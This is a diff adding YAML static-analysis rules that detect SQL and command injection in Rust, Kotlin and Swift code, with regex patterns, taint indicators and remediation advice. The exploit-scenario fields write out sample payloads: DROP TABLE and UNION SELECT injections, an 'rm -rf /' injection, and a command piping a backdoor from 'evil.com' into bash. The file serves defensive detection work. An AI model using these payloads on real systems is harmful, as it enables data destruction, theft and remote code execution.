@@ -1,0 +1,569 @@
+rules:
+- rule_id: RUST-INJ-001
+  title: SQL Injection via format! in Database Queries
+  description: 'Detects SQL queries constructed using format!() or string concatenation in Rust database clients, bypassing
+    the memory safety guarantees that Rust provides for other vulnerability classes.
+
+    '
+  language: rust
+  category: injection
+  severity: Critical
+  confidence: 0.9
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - sqlx
+  - diesel
+  - tokio-postgres
+  - sea-orm
+  patterns:
+  - type: regex
+    pattern: (?:query|execute|query_as)\s*\(\s*&format!\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b
+  - type: regex
+    pattern: sql_query\s*\(\s*&format!\s*\(
+  - type: regex
+    pattern: \.execute\s*\(\s*&format!\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\{[^}]*\}
+  - type: regex
+    pattern: \.query\s*\(\s*&\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*"\s*\.to_owned\(\)\s*\+\s*&
+  - type: regex
+    pattern: (?:query_one|query_opt|query_all)\s*\(\s*&format!\s*\(
+  - type: regex
+    pattern: Statement::from_string\s*\(\s*\w+\s*,\s*format!\s*\(
+  anti_patterns:
+  - sqlx::query!
+  - query_as!
+  - diesel::sql_query.*bind
+  - bind(
+  - query!("SELECT
+  - $1
+  - Iden
+  - sea_query::Query
+  - QueryBuilder
+  - prepare(
+  context_awareness:
+    surrounding_context_patterns:
+    - use sqlx
+    - use diesel
+    - use tokio_postgres
+    - use sea_orm
+    - use rusqlite
+    - '#[derive(FromRow)]'
+    - '#[derive(Queryable)]'
+    - async fn
+    - Pool<Postgres>
+    - Pool<MySql>
+    - Pool<Sqlite>
+    taint_source_indicators:
+    - std::env::args()
+    - std::io::stdin()
+    - request.body()
+    - Query(
+    - Path(
+    - Json(
+    - Form(
+    - req.param(
+    - req.query(
+    - web::Query
+    - web::Path
+    - web::Json
+    - axum::extract
+    taint_sink_indicators:
+    - .query(
+    - .execute(
+    - .query_one(
+    - .query_opt(
+    - .query_all(
+    - sql_query(
+    - raw_sql(
+    - Statement::from_string
+    sanitization_patterns:
+    - sqlx::query!
+    - sqlx::query_as!
+    - bind(
+    - diesel query DSL
+    - sea_query builder
+    - prepare(
+    - $1 placeholder
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + data_sensitivity_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Rust web service using Actix-web constructs a database query: sqlx::query(&format!("SELECT * FROM users
+      WHERE name = ''{}''", user_input)). An attacker submits user_input as "''; DROP TABLE users; --" to destroy the users
+      table.
+
+      '
+    example_payload: '''; DROP TABLE users; --'
+    attacker_objective: Exfiltrate, modify, or destroy database content despite Rust's memory safety guarantees. SQL injection
+      is a logic-level vulnerability unaffected by Rust's borrow checker.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'SQL injection in Rust applications despite memory safety guarantees. Rust''s
+
+    borrow checker prevents buffer overflows and use-after-free, but SQL injection
+
+    is a logic-level vulnerability. Successful exploitation enables full database
+
+    compromise, data exfiltration, and potential OS command execution via database
+
+    features (e.g., PostgreSQL COPY TO PROGRAM).
+
+    '
+  remediation: "Framework-specific fixes:\n  - sqlx: use compile-time checked queries with sqlx::query!() macro\n      sqlx::query!(\"\
+    SELECT * FROM users WHERE id = $1\", user_id)\n  - Diesel: use the type-safe query builder DSL\n      users.filter(name.eq(&user_name)).load::<User>(&conn)\n\
+    \  - tokio-postgres: use parameterized queries\n      client.query(\"SELECT * FROM users WHERE id = $1\", &[&user_id])\n\
+    \  - SeaORM: use Entity query builder\n      User::find().filter(user::Column::Name.eq(name)).one(&db)\n  - rusqlite:\
+    \ use named or positional parameters\n      conn.execute(\"INSERT INTO users (name) VALUES (?1)\", params![name])\nSecure\
+    \ libraries:\n  - sqlx with compile-time query verification (sqlx::query! macro)\n  - Diesel ORM with type-safe DSL\n\
+    \  - SeaORM with entity query builders\n  - rusqlite with params! macro\nPrevention strategies:\n  - Never use format!()\
+    \ for SQL query construction\n  - Prefer compile-time checked query macros (sqlx::query!)\n  - Use parameterized queries\
+    \ with bind parameters ($1, ?1)\n  - Enable clippy lints and custom lints for format!() + SQL detection\n  - Use integration\
+    \ tests to verify parameterized query usage\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - RUST-INJ-002
+    - KOTLIN-INJ-001
+    - SWIFT-INJ-001
+    - TS-INJ-001
+  detection_layer: 1
+- rule_id: RUST-INJ-002
+  title: Command Injection via std::process::Command with Shell
+  description: 'Detects Command::new with user input passed through shell interpreters or directly as the command/program
+    name, enabling OS command injection.
+
+    '
+  language: rust
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - process-command
+  - shell-injection
+  - rce
+  patterns:
+  - type: regex
+    pattern: Command::new\s*\(\s*"(?:sh|bash|cmd|powershell)"\s*\)\s*\.arg\s*\(\s*"-c"\s*\)\s*\.arg\s*\(\s*(?:&?format!|&?\w*input|&?\w*user|&?\w*param)
+  - type: regex
+    pattern: Command::new\s*\(\s*(?:&?user_input|&?input|&?param|&?cmd)\b
+  - type: regex
+    pattern: Command::new\s*\(\s*"(?:sh|bash)"\s*\)[^;]*\.arg\s*\(\s*&format!\s*\(
+  - type: regex
+    pattern: Command::new\s*\(\s*"cmd"\s*\)\s*\.args?\s*\(\s*&?\[?\s*"/[cC]"\s*,\s*(?:&?format!|&?\w*input|&?\w*user|&?\w*param)
+  - type: regex
+    pattern: Command::new\s*\(\s*"(?:sh|bash|cmd|powershell)"\s*\)[^;]*\.arg\s*\(\s*(?:&?\w*query|&?\w*request|&?\w*body)\b
+  - type: regex
+    pattern: Command::new\s*\(\s*(?:&?\w+)\s*\)\s*\.args?\s*\(\s*&?\[?\s*"-c"\s*,\s*(?:&?format!|&?\w*input)
+  anti_patterns:
+  - Command::new(.*).arg(.*).arg(
+  - sanitize
+  - allowlist
+  - ALLOWED_COMMANDS
+  - which(
+  - Path::new
+  - canonicalize
+  - regex::Regex
+  - is_alphanumeric
+  - .args(&[
+  context_awareness:
+    surrounding_context_patterns:
+    - use std::process::Command
+    - use std::process
+    - use tokio::process::Command
+    - use async_process::Command
+    - '#[tokio::main]'
+    - '#[actix_web::main]'
+    - fn main()
+    - async fn handle
+    taint_source_indicators:
+    - std::env::args()
+    - std::io::stdin()
+    - request.body()
+    - Query(
+    - Path(
+    - Json(
+    - Form(
+    - web::Query
+    - web::Path
+    - axum::extract
+    - std::env::var(
+    taint_sink_indicators:
+    - Command::new(
+    - .arg(
+    - .args(
+    - .spawn()
+    - .output()
+    - .status()
+    sanitization_patterns:
+    - Command::new(program).arg(arg1).arg(arg2)
+    - is_alphanumeric()
+    - regex validation
+    - allowlist check
+    - which::which
+    - Path::new().canonicalize()
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 + shell_invocation_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Rust service converts files via Command::new("sh").arg("-c").arg(&format!("convert {} output.png",
+      user_filename)). An attacker provides filename="; rm -rf / #" to inject shell commands alongside the intended convert
+      operation.
+
+      '
+    example_payload: file.txt; curl http://evil.com/backdoor | bash
+    attacker_objective: Execute arbitrary OS commands to gain remote code execution, despite Rust's memory safety guarantees.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Command injection despite Rust''s memory safety -- logic bugs still apply.
+
+    When user input flows into shell interpreters, an attacker can execute
+
+    arbitrary commands. This is especially dangerous in Rust services that
+
+    may run with elevated privileges due to confidence in Rust''s safety.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Actix-web/Axum: validate and sanitize all path/query parameters before use\
+    \ in commands\n  - Tokio: use tokio::process::Command with separate .arg() calls\n  - General Rust: use std::process::Command\
+    \ with .arg() chaining instead of shell -c\nSecure libraries:\n  - std::process::Command with .arg() for each argument\
+    \ (avoids shell)\n  - which crate to resolve command paths safely\n  - regex crate for input validation patterns\n  -\
+    \ shell-escape crate for escaping when shell invocation is unavoidable\nPrevention strategies:\n  - Pass command and arguments\
+    \ separately to Command::new().arg()\n  - Never use shell=true or invoke shell interpreters (sh -c, bash -c, cmd /c) with\
+    \ user input\n  - Validate input against strict allowlists using regex\n  - Use Path::new().canonicalize() to validate\
+    \ file paths\n  - Apply is_alphanumeric() or character-class validation on user input\n  - Run subprocesses with reduced\
+    \ privileges using std::os::unix::process::CommandExt\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RUST-INJ-001
+    - CPP-INJ-001
+    - RUBY-INJ-002
+  detection_layer: 1
+- rule_id: KOTLIN-INJ-001
+  title: SQL Injection in Kotlin JDBC/Exposed
+  description: 'Detects SQL injection via string templates in Kotlin database queries using JDBC, Exposed, or other database
+    access libraries.
+
+    '
+  language: kotlin
+  category: injection
+  severity: Critical
+  confidence: 0.92
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - jdbc
+  - exposed
+  - spring-data
+  - jooq
+  - android
+  patterns:
+  - type: regex
+    pattern: (?:createStatement|Statement)\s*\([^)]*\)\s*\.(?:executeQuery|executeUpdate)\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\$\{
+  - type: regex
+    pattern: \.(?:executeQuery|executeUpdate|execute)\s*\(\s*"[^"]*\$\{[^}]*(?:request|param|input|user)\b
+  - type: regex
+    pattern: exec\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\$\{
+  - type: regex
+    pattern: (?:jdbcTemplate|namedParameterJdbcTemplate)\s*\.(?:query|update|execute)\s*\(\s*"[^"]*\$\{[^}]*(?:request|param|input|user)\b
+  - type: regex
+    pattern: \.(?:rawQuery|execSQL)\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\$\{
+  - type: regex
+    pattern: transaction\s*\{[^}]*exec\s*\(\s*"[^"]*\$\{[^}]*(?:request|param|input|user)\b
+  anti_patterns:
+  - prepareStatement
+  - setString
+  - Exposed.select
+  - JdbcTemplate(.*?)
+  - '@Query('
+  - CriteriaBuilder
+  - jooq
+  - DSL.field
+  - Room.databaseBuilder
+  - '? placeholder'
+  - :paramName
+  - parameterized
+  - namedParam
+  context_awareness:
+    surrounding_context_patterns:
+    - import java.sql
+    - import org.jetbrains.exposed
+    - import org.springframework.jdbc
+    - import org.jooq
+    - import android.database.sqlite
+    - import androidx.room
+    - '@Repository'
+    - '@Service'
+    - '@RestController'
+    - class.*Repository
+    - fun.*Controller
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@PathVariable'
+    - '@RequestBody'
+    - intent.getStringExtra(
+    - intent.extras
+    - args[
+    - readLine()
+    - params[
+    - call.receive(
+    - call.parameters[
+    taint_sink_indicators:
+    - executeQuery(
+    - executeUpdate(
+    - execute(
+    - rawQuery(
+    - execSQL(
+    - jdbcTemplate.query(
+    - jdbcTemplate.update(
+    - exec(
+    - connection.createStatement()
+    sanitization_patterns:
+    - prepareStatement
+    - setString(
+    - setInt(
+    - PreparedStatement
+    - CriteriaBuilder
+    - Exposed DSL
+    - '@Query with :param'
+    - jOOQ DSL
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + data_sensitivity_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Kotlin Spring Boot application has an endpoint that searches users: jdbcTemplate.query("SELECT * FROM
+      users WHERE name = ''${request.getParameter("name")}''"). An attacker submits name=admin'' UNION SELECT credit_card
+      FROM payments-- to extract credit card data from a different table.
+
+      '
+    example_payload: admin' UNION SELECT username,password,null FROM admin_users--
+    attacker_objective: Exfiltrate sensitive data, bypass authentication, modify records, or escalate to OS command execution
+      via database features.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'SQL injection in Kotlin applications via string template interpolation.
+
+    Kotlin''s string templates (${ }) make it easy to inadvertently interpolate
+
+    user input into SQL queries. This affects server-side (Spring Boot, Ktor)
+
+    and Android applications (SQLite), enabling full database compromise.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Spring JDBC: use PreparedStatement or JdbcTemplate with ? placeholders\n  \
+    \    jdbcTemplate.query(\"SELECT * FROM users WHERE name = ?\", arrayOf(name), rowMapper)\n  - Kotlin Exposed: use the\
+    \ type-safe DSL\n      Users.select { Users.name eq userName }\n  - Ktor: use parameterized queries with the database\
+    \ driver\n  - Android Room: use @Query with :param placeholders, compiled at build time\n      @Query(\"SELECT * FROM\
+    \ users WHERE name = :name\") fun findByName(name: String): User\n  - Android SQLite: use query() with selectionArgs\n\
+    \      db.query(\"users\", null, \"name = ?\", arrayOf(name), null, null, null)\n  - jOOQ: use the type-safe query builder\
+    \ DSL\nSecure libraries:\n  - Kotlin Exposed ORM (JetBrains) with type-safe DSL\n  - Spring Data JPA with @Query and named\
+    \ parameters\n  - jOOQ for type-safe SQL construction\n  - Android Room Persistence Library with compile-time verification\n\
+    Prevention strategies:\n  - Use PreparedStatement or Kotlin Exposed DSL with type-safe queries\n  - Never use string templates\
+    \ to construct SQL queries\n  - Enable detekt static analysis with custom SQL injection rules\n  - Use @Query annotations\
+    \ with named parameters in Spring Data\n  - Apply input validation at controller/endpoint boundaries\n  - Use database\
+    \ connection pools with read-only users for query-only operations\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - SWIFT-INJ-001
+    - RUST-INJ-001
+    - TS-INJ-001
+    - RUBY-INJ-001
+  detection_layer: 1
+- rule_id: SWIFT-INJ-001
+  title: SQL Injection in Swift Database Queries
+  description: 'Detects SQL injection via string interpolation in Swift database clients including SQLite.swift, GRDB, FMDB,
+    and raw sqlite3 C API usage.
+
+    '
+  language: swift
+  category: injection
+  severity: Critical
+  confidence: 0.89
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - sqlite
+  - grdb
+  - fmdb
+  - core-data
+  - ios
+  - macos
+  patterns:
+  - type: regex
+    pattern: (?:execute|prepare|run)\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\\?\([^)]*(?:request|param|input|user)\b
+  - type: regex
+    pattern: sqlite3_exec\s*\([^,]*,\s*"[^"]*\\?\([^)]*(?:input|user|param)\b
+  - type: regex
+    pattern: (?:execute|run)\s*\(\s*"[^"]*"\s*\+\s*(?:input|user|param|request)\b
+  - type: regex
+    pattern: (?:executeStatements|executeQuery|executeUpdate)\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\\?\([^)]*(?:request|param|input|user)\b
+  - type: regex
+    pattern: (?:execute|prepare|run)\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\\\((?:request|param|input|user)\b
+  - type: regex
+    pattern: NSPredicate\s*\(\s*format:\s*"[^"]*\\\([^)]*(?:input|user|param)\b
+  anti_patterns:
+  - Statement.bind
+  - 'arguments:'
+  - parametrize
+  - '? placeholder'
+  - Row.fetchOne
+  - Column(
+  - Table(
+  - SQLRequest
+  - StatementArguments
+  - 'withArguments:'
+  - 'values: ['
+  - NSPredicate(format:.*%@
+  - '#keyPath'
+  context_awareness:
+    surrounding_context_patterns:
+    - import SQLite
+    - import GRDB
+    - import FMDB
+    - import CoreData
+    - import SQLite3
+    - '#import <sqlite3.h>'
+    - class.*ViewController
+    - class.*Repository
+    - struct.*Model
+    - class.*DataManager
+    taint_source_indicators:
+    - textField.text
+    - searchBar.text
+    - URLComponents
+    - queryItems
+    - UserDefaults
+    - ProcessInfo.processInfo.arguments
+    - request.httpBody
+    - URLRequest
+    - UIPasteboard
+    - readLine()
+    - CommandLine.arguments
+    taint_sink_indicators:
+    - execute(
+    - prepare(
+    - run(
+    - sqlite3_exec(
+    - executeStatements(
+    - executeQuery(
+    - executeUpdate(
+    - sqlite3_prepare_v2(
+    - 'NSPredicate(format:'
+    - NSFetchRequest
+    sanitization_patterns:
+    - 'arguments: ['
+    - Statement.bind
+    - StatementArguments
+    - '? placeholder'
+    - sqlite3_bind_text
+    - sqlite3_bind_int
+    - 'withArguments:'
+    - '%@ in NSPredicate'
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + data_sensitivity_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An iOS application searches for products using a text field: db.execute("SELECT * FROM products WHERE
+      name LIKE ''%\(searchField.text!)%''"). An attacker enters "''; DROP TABLE products; --" in the search field, destroying
+      the local product database.
+
+      '
+    example_payload: '''; UPDATE users SET role=''admin'' WHERE username=''attacker''; --'
+    attacker_objective: Manipulate the local SQLite database to bypass authentication, escalate privileges, extract sensitive
+      data, or corrupt application state.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'SQL injection in Swift applications through string interpolation in queries.
+
+    On iOS/macOS, this primarily affects local SQLite databases, which can contain
+
+    sensitive data such as user credentials, authentication tokens, personal info,
+
+    and cached API responses. On server-side Swift (Vapor/Kitura), this can
+
+    compromise backend databases.
+
+    '
+  remediation: "Framework-specific fixes:\n  - SQLite.swift: use the type-safe Expression API\n      users.filter(name ==\
+    \ searchTerm)\n  - GRDB: use parameterized SQL with arguments\n      try db.execute(sql: \"SELECT * FROM users WHERE id\
+    \ = ?\", arguments: [userId])\n  - FMDB: use executeQuery with arguments array\n      db.executeQuery(\"SELECT * FROM\
+    \ users WHERE id = ?\", withArgumentsIn: [userId])\n  - Core Data: use NSPredicate with %@ format specifier\n      NSPredicate(format:\
+    \ \"name == %@\", userName)\n  - Raw sqlite3: use sqlite3_prepare_v2 with sqlite3_bind_text\n  - Vapor (server-side):\
+    \ use Fluent ORM query builder\nSecure libraries:\n  - SQLite.swift with type-safe query builder\n  - GRDB with SQL interpolation\
+    \ using StatementArguments\n  - Core Data with NSPredicate and %@ substitution\n  - Fluent ORM for server-side Swift (Vapor)\n\
+    Prevention strategies:\n  - Use parameterized queries with ? placeholders and arguments arrays\n  - Use type-safe query\
+    \ builders (SQLite.swift Expression, GRDB record protocols)\n  - Never concatenate or interpolate user input into SQL\
+    \ strings\n  - Use SwiftLint custom rules to flag string interpolation in SQL contexts\n  - Encrypt local databases with\
+    \ SQLCipher for defense in depth\n  - Apply App Transport Security and certificate pinning for data in transit\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - KOTLIN-INJ-001
+    - RUST-INJ-001
+    - TS-INJ-001
+    - RUBY-INJ-001
+  detection_layer: 1
